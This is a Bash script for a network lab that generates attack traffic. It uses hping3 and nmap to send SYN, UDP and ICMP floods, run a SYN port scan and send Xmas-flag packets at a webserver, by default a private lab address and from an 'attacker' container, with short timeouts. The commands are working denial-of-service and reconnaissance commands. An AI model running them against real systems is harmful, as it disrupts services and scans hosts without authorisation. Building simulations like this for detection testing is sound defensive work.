#!/usr/bin/env bash
# ==========================================================
#  Attacker Traffic Generator
# ==========================================================
# Simulates hostile network traffic against the Webserver:
#  1. TCP SYN Flood (DoS / Connection exhaustion)
#  2. UDP Flood (Bandwidth exhaustion)
#  3. ICMP Ping Flood (Smurf / Ping of Death)
#  4. Nmap Stealth Port Scan (Reconnaissance)
#  5. Invalid TCP Flags (Xmas / FIN scan anomalies)
# ==========================================================

set -euo pipefail

WEBSERVER_IP="${1:-10.10.2.10}"
ATTACK_TYPE="${2:-menu}"
DURATION_SEC="${3:-5}"

USE_INCUS="${USE_INCUS:-auto}"
INCUS_EXEC=""
if [ "$USE_INCUS" = "auto" ] || [ "$USE_INCUS" = "1" ]; then
    if command -v incus >/dev/null 2>&1 && incus list 2>/dev/null | grep -q "attacker.*RUNNING"; then
        INCUS_EXEC="incus exec attacker --"
    elif sudo incus list 2>/dev/null | grep -q "attacker.*RUNNING"; then
        INCUS_EXEC="sudo incus exec attacker --"
    fi
fi

run_cmd() {
    if [ -n "$INCUS_EXEC" ]; then
        $INCUS_EXEC "$@"
    else
        "$@"
    fi
}

show_menu() {
    echo "=========================================================="
    echo "          Attacker Cyber Attack Simulator                 "
    echo "=========================================================="
    echo "[+] Target Webserver: $WEBSERVER_IP"
    if [ -n "$INCUS_EXEC" ]; then
        echo "[+] Origin:           Incus container 'attacker'"
    else
        echo "[+] Origin:           Local host / VM"
    fi
    echo ""
    echo "Select Attack Vector:"
    echo "  1) TCP SYN Flood (Port 80)          - High-rate SYN packet blast"
    echo "  2) UDP Flood (Port 53)              - High-volume UDP flood"
    echo "  3) ICMP Ping Flood                  - Ping of death / flood"
    echo "  4) Nmap TCP SYN Port Scan           - Stealth port reconnaissance (Ports 1-1000)"
    echo "  5) Invalid TCP Flags (Xmas Attack)  - URG+PSH+FIN malformed packets"
    echo "  6) Full Multi-Vector Assault        - Run all attacks sequentially"
    echo "  q) Quit"
    echo ""
    read -rp "Enter choice [1-6]: " choice
    case "$choice" in
        1) attack_syn ;;
        2) attack_udp ;;
        3) attack_icmp ;;
        4) attack_scan ;;
        5) attack_xmas ;;
        6) attack_all ;;
        q|Q) exit 0 ;;
        *) echo "Invalid choice"; exit 1 ;;
    esac
}

attack_syn() {
    echo ""
    echo "[!] [ATTACK] Launching TCP SYN Flood against $WEBSERVER_IP:80 (${DURATION_SEC}s)..."
    echo "    Command: hping3 -S -p 80 --flood $WEBSERVER_IP"
    run_cmd timeout "$DURATION_SEC" hping3 -S -p 80 --flood "$WEBSERVER_IP" 2>/dev/null || true
    echo "[+] SYN Flood burst finished."
}

attack_udp() {
    echo ""
    echo "[!] [ATTACK] Launching UDP Flood against $WEBSERVER_IP:53 (${DURATION_SEC}s)..."
    echo "    Command: hping3 --udp -p 53 --flood $WEBSERVER_IP"
    run_cmd timeout "$DURATION_SEC" hping3 --udp -p 53 --flood "$WEBSERVER_IP" 2>/dev/null || true
    echo "[+] UDP Flood burst finished."
}

attack_icmp() {
    echo ""
    echo "[!] [ATTACK] Launching ICMP Ping Flood against $WEBSERVER_IP (${DURATION_SEC}s)..."
    echo "    Command: hping3 -1 --flood $WEBSERVER_IP"
    run_cmd timeout "$DURATION_SEC" hping3 -1 --flood "$WEBSERVER_IP" 2>/dev/null || true
    echo "[+] ICMP Ping Flood burst finished."
}

attack_scan() {
    echo ""
    echo "[!] [ATTACK] Running Nmap Stealth SYN Port Scan (Ports 1-1000)..."
    echo "    Command: nmap -sS -Pn -T4 -p 1-1000 $WEBSERVER_IP"
    run_cmd nmap -sS -Pn -T4 -p 1-1000 "$WEBSERVER_IP" || true
    echo "[+] Port scan completed."
}

attack_xmas() {
    echo ""
    echo "[!] [ATTACK] Sending Malformed TCP Xmas Packets (URG+PSH+FIN) (${DURATION_SEC}s)..."
    echo "    Command: hping3 -F -P -U -p 80 -c 100 -i u1000 $WEBSERVER_IP"
    run_cmd timeout "$DURATION_SEC" hping3 -F -P -U -p 80 -c 100 -i u1000 "$WEBSERVER_IP" 2>/dev/null || true
    echo "[+] Malformed packet injection completed."
}

attack_all() {
    echo "=== Running Multi-Vector Assault Test Suite ==="
    attack_scan
    sleep 1
    attack_syn
    sleep 1
    attack_udp
    sleep 1
    attack_icmp
    sleep 1
    attack_xmas
    echo "=== Assault Completed ==="
}

case "$ATTACK_TYPE" in
    syn)
        attack_syn
        ;;
    udp)
        attack_udp
        ;;
    icmp)
        attack_icmp
        ;;
    scan)
        attack_scan
        ;;
    xmas)
        attack_xmas
        ;;
    all)
        attack_all
        ;;
    menu|*)
        show_menu
        ;;
esac
